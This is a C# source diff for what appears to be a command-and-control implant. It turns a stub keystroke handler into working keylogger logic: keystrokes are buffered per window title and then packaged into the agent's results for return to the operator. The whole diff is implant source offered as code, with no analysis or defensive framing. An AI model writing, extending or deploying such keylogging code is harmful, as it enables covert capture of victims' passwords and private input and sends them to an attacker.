@@ -1,9 +1,8 @@
 ﻿using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
-using Renci.SshNet.Common;
 using System.Collections.Concurrent;
-using System.Drawing;
+using System.Text;
 using System.Text.Json;
 
 namespace Agent.Managers
@@ -23,6 +22,8 @@ namespace Agent.Managers
         private bool stdOutIsMonitored = false;
         private string monitoring_task = "";
         private TextWriter origStdOut;
+        private static string klTask = String.Empty;
+        private static Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();
         private ILogger logger { get; set; }
 
         public MessageManager(ILogger logger)
@@ -31,7 +32,22 @@ namespace Agent.Managers
         }
         public async Task AddKeystroke(string window_title, string task_id, string key)
         {
-            throw new NotImplementedException();
+            if (String.IsNullOrEmpty(klTask))
+            {
+                klTask = task_id;
+            }
+
+            if (!klLogs.ContainsKey(window_title))
+            {
+                klLogs.Add(window_title, new Keylogs()
+                {
+                    window_title = window_title,
+                    user = String.Empty,
+                    builder = new StringBuilder()
+                });
+            }
+
+            klLogs[window_title].builder.Append(key);
         }
         public async Task AddResponse(DelegateMessage dm)
         {
@@ -179,6 +195,17 @@ namespace Agent.Managers
             foreach (string response in responseStrings)
             {
                 results.Add(response);
+            }
+
+            if (!String.IsNullOrEmpty(klTask) && klLogs.Count > 0)
+            {
+                KeystrokesResponseResult krr = new KeystrokesResponseResult();
+                krr.task_id = klTask;
+                krr.keylogs = klLogs.Values.ToList();
+                krr.Prepare();
+
+                results.Add(krr.ToJson());
+                klLogs.Clear();
             }
 
             fileBrowserResults.Clear();
